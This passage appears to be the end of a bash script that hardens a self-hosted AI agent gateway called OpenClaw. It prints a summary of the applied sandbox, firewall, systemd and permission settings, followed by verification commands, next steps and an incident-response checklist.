echo "  Gateway bind:        loopback (127.0.0.1 only)"
echo "  Docker sandbox:      $WITH_SANDBOX"
echo "  nftables firewall:   $WITH_FIREWALL"
echo "  AppArmor profile:    $WITH_APPARMOR"
echo

echo -e "${C_BLUE}Generated Files:${C_NC}"
echo "  Config:              $OC_CONFIG"
echo "  Environment:         $OC_ENV_FILE"
echo "  systemd service:     $SYSTEMD_USER_DIR/openclaw-gateway.service"
echo "  systemd hardening:   $DROPIN_DIR/hardening.conf"
echo "  Audit service:       $SYSTEMD_USER_DIR/openclaw-audit.service"
echo "  Audit timer:         $SYSTEMD_USER_DIR/openclaw-audit.timer"
echo "  Audit script:        $AUDIT_SCRIPT"
echo "  Log rotation:        /etc/logrotate.d/openclaw"
echo "  Exec denylist:       $DENYLIST_FILE"
if [[ "$WITH_FIREWALL" == true ]]; then
echo "  nftables rules:      /etc/nftables.d/openclaw.conf"
fi
if [[ "$WITH_APPARMOR" == true ]]; then
echo "  AppArmor profile:    /etc/apparmor.d/openclaw-gateway"
fi
echo "  Hardening log:       $LOGFILE"
echo

echo -e "${C_BLUE}Hardening Applied (27 Steps):${C_NC}"
echo "  Phase 1:  System Prerequisites"
echo "    [1]  Node.js version verified (>= 22.12.0)"
echo "    [2]  Dedicated non-root user verified: $OC_USER"
echo "  Phase 2:  Gateway Hardening"
echo "    [3]  256-bit authentication token generated"
echo "    [4]  Hardened openclaw.json (loopback, auth, no tailscale)"
echo "  Phase 3:  Channel & DM Policy"
echo "    [5]  All channels: dmPolicy=pairing, requireMention=true"
echo "  Phase 4:  Tool & Execution Security"
echo "    [6]  Tool profile: messaging (minimal)"
echo "    [7]  Exec: allowlist + safe bins + deny bins"
echo "    [8]  Elevated mode: DISABLED"
echo "    [9]  Web tools: search+fetch enabled, browser DISABLED"
echo "    [10] Cross-context messaging: BLOCKED"
echo "  Phase 5:  Sandbox"
if [[ "$WITH_SANDBOX" == true ]]; then
echo "    [11] Docker sandbox: ALL mode, no-net, ro-root, 512MB, 0.5 CPU"
else
echo "    [11] Docker sandbox: not configured (use --with-sandbox)"
fi
echo "  Phase 6:  Plugin & Skill Security"
echo "    [12] Plugins: deny-by-default, empty allowlist"
echo "    [13] Hooks: DISABLED (anti prompt injection)"
echo "  Phase 7:  Logging & Redaction"
echo "    [14] Logging: info level, sensitive data redacted"
echo "    [15] Log rotation: daily, 14-day retention"
echo "  Phase 8:  File Permissions"
echo "    [16] Permissions: 700 dirs, 600 configs/credentials"
echo "    [17] Secure env file with API key placeholders"
echo "  Phase 9:  systemd Hardening"
echo "    [18] User service: openclaw-gateway.service"
echo "    [19] Drop-in: ProtectSystem=strict, NoNewPrivileges, syscall filter"
echo "  Phase 10: Firewall"
if [[ "$WITH_FIREWALL" == true ]]; then
echo "    [20] nftables: loopback-only inbound, rate-limited"
else
echo "    [20] nftables: not configured (use --with-firewall)"
fi
echo "  Phase 11: AppArmor"
if [[ "$WITH_APPARMOR" == true ]]; then
echo "    [21] AppArmor: enforce mode, deny ptrace/mount/raw"
else
echo "    [21] AppArmor: not configured (use --with-apparmor)"
fi
echo "  Phase 12: Audit & Workspace"
echo "    [22] Workspace: git-initialized for rollback"
echo "    [23] Security audit: executed (if CLI available)"
echo "    [24] Audit timer: weekly automated scan"
echo "  Phase 13: Denylist"
echo "    [25] Dangerous command denylist documented"
echo "  Phase 14: Secret Scanning"
echo "    [26] detect-secrets: baseline + pre-commit hook"
echo

echo -e "${C_BLUE}systemd Hardening Summary:${C_NC}"
echo "  - ProtectSystem=strict (read-only /usr, /boot, /etc)"
echo "  - ProtectHome=read-only (needs read access to ~/.openclaw)"
echo "  - ReadWritePaths=$OC_DIR only"
echo "  - PrivateTmp=yes, PrivateDevices=yes"
echo "  - NoNewPrivileges=yes, LockPersonality=yes"
echo "  - RestrictSUIDSGID=yes, CapabilityBoundingSet= (empty)"
echo "  - ProtectKernelTunables/Modules/Logs/ControlGroups=yes"
if [[ "$WITH_SANDBOX" == true ]]; then
echo "  - RestrictNamespaces=~cgroup ~ipc (allow Docker namespaces)"
else
echo "  - RestrictNamespaces=yes (all restricted)"
fi
echo "  - RestrictRealtime=yes"
echo "  - SystemCallFilter=@system-service @network-io"
echo "  - SystemCallFilter deny: @mount @reboot @swap @clock @debug @obsolete @raw-io @privileged"
echo "  - SystemCallArchitectures=native"
echo "  - MemoryDenyWriteExecute=no (V8 JIT requires W+X pages)"
echo "  - IPAddressAllow=localhost, IPAddressDeny=any"
echo "  - ProtectProc=invisible, ProcSubset=pid"
echo "  - ProtectHostname=yes"
echo

echo -e "${C_YELLOW}IMPORTANT — Verification Commands:${C_NC}"
echo "  # Check OpenClaw health"
echo "  su - $OC_USER -c 'openclaw doctor'"
echo ""
echo "  # Run deep security audit"
echo "  su - $OC_USER -c 'openclaw security audit --deep'"
echo ""
echo "  # Start the gateway service"
echo "  su - $OC_USER -c 'systemctl --user start openclaw-gateway'"
echo ""
echo "  # Check service status"
echo "  su - $OC_USER -c 'systemctl --user status openclaw-gateway'"
echo ""
echo "  # View gateway logs"
echo "  su - $OC_USER -c 'journalctl --user -u openclaw-gateway -f'"
echo ""
echo "  # Check audit timer"
echo "  su - $OC_USER -c 'systemctl --user list-timers openclaw-audit.timer'"
echo ""
echo "  # Verify AppArmor (if enabled)"
echo "  aa-status 2>/dev/null | grep openclaw"
echo ""
echo "  # Verify nftables (if enabled)"
echo "  nft list table inet openclaw 2>/dev/null"
echo ""
echo "  # Verify file permissions"
echo "  stat -c '%a %U:%G %n' $OC_CONFIG $OC_ENV_FILE $OC_DIR"
echo ""
echo "  # Scan workspace for secrets"
echo "  cd $OC_WORKSPACE && detect-secrets scan --baseline .secrets.baseline"
echo

echo -e "${C_YELLOW}IMPORTANT — Next Steps:${C_NC}"
echo "  1. Edit $OC_ENV_FILE and add your actual API keys:"
echo "     ANTHROPIC_API_KEY=sk-ant-..."
echo "     OPENAI_API_KEY=sk-..."
echo ""
echo "  2. Approve pairing codes for trusted contacts:"
echo "     When a user DMs the bot for the first time, a pairing code"
echo "     is displayed. Approve it via the OpenClaw control UI or CLI:"
echo "     openclaw pair approve <code>"
echo ""
echo "  3. Manage the exec allowlist carefully:"
echo "     openclaw exec list          # Show allowed commands"
echo "     openclaw exec approve <cmd> # Approve a specific command"
echo "     openclaw exec deny <cmd>    # Deny a command"
echo "     NEVER approve destructive commands (see $DENYLIST_FILE)"
echo ""
echo "  4. Start the gateway:"
echo "     su - $OC_USER -c 'systemctl --user enable --now openclaw-gateway'"
echo ""
if [[ "$WITH_SANDBOX" != true ]]; then
echo "  5. Consider enabling Docker sandbox for stronger isolation:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-sandbox"
echo ""
fi
if [[ "$WITH_FIREWALL" != true ]]; then
echo "  6. Consider enabling nftables firewall rules:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-firewall"
echo ""
fi
if [[ "$WITH_APPARMOR" != true ]]; then
echo "  7. Consider enabling AppArmor confinement:"
echo "     sudo ./openclaw.sh -u $OC_USER --with-apparmor"
echo ""
fi

echo -e "${C_RED}INCIDENT RESPONSE — Quick Reference:${C_NC}"
echo "  If you suspect the AI agent has been compromised:"
echo ""
echo "  1. STOP the gateway immediately:"
echo "     su - $OC_USER -c 'systemctl --user stop openclaw-gateway'"
echo ""
echo "  2. Revoke the gateway token:"
echo "     Generate a new token and update $OC_ENV_FILE"
echo "     openssl rand -hex 32"
echo ""
echo "  3. Review session transcripts:"
echo "     ls -la $OC_DIR/agents/*/sessions/"
echo ""
echo "  4. Check for unauthorized file changes:"
echo "     cd $OC_WORKSPACE && git status && git diff"
echo ""
echo "  5. Rotate ALL API keys:"
echo "     Update ANTHROPIC_API_KEY and OPENAI_API_KEY in $OC_ENV_FILE"
echo ""
echo "  6. Run security audit:"
echo "     su - $OC_USER -c 'openclaw security audit --deep --filesystem'"
echo ""
echo "  7. Check system for persistence mechanisms:"
echo "     crontab -l -u $OC_USER"
echo "     systemctl --user list-units --type=service"
echo "     ls -la /tmp/ /var/tmp/"
echo ""
echo "  8. Review nftables/iptables for unauthorized rules:"
echo "     nft list ruleset"
echo ""

echo -e "${C_GREEN}Done. Full hardening log: $LOGFILE${C_NC}"
